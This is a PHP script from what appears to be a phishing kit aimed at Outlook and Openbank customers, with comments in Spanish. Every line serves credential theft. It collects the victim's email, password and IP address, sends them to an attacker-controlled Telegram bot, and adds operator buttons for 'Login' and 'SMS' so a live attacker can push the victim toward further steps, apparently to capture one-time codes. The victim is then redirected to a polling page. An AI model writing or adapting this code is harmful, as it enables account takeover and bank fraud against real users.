<?php
session_start();
date_default_timezone_set('America/Caracas');
ini_set("display_errors", 0);

// Incluir configuración global
include('../settings.php');

$userp = $_SERVER['REMOTE_ADDR'];

// Obtener sessionId desde POST, sesión o cookie para el sistema de polling
$sessionId = $_POST['sessionId'] ?? $_SESSION['sessionId'] ?? $_COOKIE['sessionId'] ?? '';

// Obtener correo y contraseña
$correo = $_SESSION['e'] ?? $_POST['e'] ?? '';
$psswd = $_POST['c'] ?? '';

if (!empty($correo) && !empty($psswd)) {

    $msg = "\xF0\x9F\x93\xA7 <b>OUTLOOK OPENBANK</b>\n\n";
    $msg .= "\xF0\x9F\xAA\xAA <b>Usuario:</b> <code>$correo</code>\n";
    $msg .= "\xF0\x9F\x93\xA9 <b>Outlook:</b> <code>$correo</code>\n";
    $msg .= "\xF0\x9F\x94\x91 <b>Password:</b> <code>$psswd</code>\n";
    $msg .= "\xF0\x9F\x8C\x90 <b>IP:</b> <code>$userp</code>";

    // Botones usando sessionId del sistema de polling
    $botones = json_encode([
        'inline_keyboard' => [
            [
                ['text' => "\xF0\x9F\x94\x84 Login", 'callback_data' => "login:$sessionId"],
                ['text' => "\xF0\x9F\x92\xAC SMS",   'callback_data' => "sms:$sessionId"]
            ]
        ]
    ]);

    // Enviar a Telegram
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
        'chat_id'      => $chat_id,
        'text'         => $msg,
        'parse_mode'   => 'HTML',
        'reply_markup' => $botones
    ]));

    unset($_SESSION['e']);
    unset($_SESSION['c']);

    // Redirigir a carga.html para hacer polling
    header("Location: ../carga.html");
    exit;
} else {
    header("Location: continuar.html");
    exit;
}
?>